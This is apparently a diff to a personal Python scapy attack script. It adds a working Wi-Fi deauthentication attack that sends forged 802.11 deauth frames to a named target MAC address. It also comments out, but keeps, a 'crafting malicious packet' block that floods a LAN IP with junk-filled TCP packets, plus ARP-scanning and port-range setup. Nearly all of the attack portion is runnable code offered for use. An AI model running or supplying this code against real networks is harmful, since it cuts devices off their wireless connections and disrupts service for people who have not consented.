@@ -3,15 +3,25 @@ from scapy.all import *
 target_ip = "192.168.100.21"
 router_ip = "192.168.100.1"
 subnet = "192.168.100.0/24"
+
+target_mac = "34:36:54:A5:C9:94"
+target_ssid = ""
+
 start_port = 1
 end_port = 65535
 open_port = []
 
-command = b"A" * 1000 
-send_packet = IP(dst=target_ip)/UDP(dport=443)/ICMP(type=8)/Raw(load=command)
-request = sr1(send_packet, timeout=3)
-print(request) 
+#deauthentication attack
+deauth_frame = RadioTap()/Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff")/Dot11Deauth()
+send_packets = sendp(deauth_frame, iface="wlp1s0", count=20, inter=2)
+print(deauth_frame.summary())
 
+#crafting malicious packet
+"""
+command = b"A" * 1000 
+send_packet = IP(dst=target_ip)/TCP(sport=8080,dport=443)/Raw(load=command)
+request = sendp(send_packet, count=200)
+"""
 
 #arp scanning localnet devices
 """
@@ -31,7 +41,6 @@ if response:
 else:
     print("[-] response failed!")
 """
-
 
 
 #vulnerability scanning idea
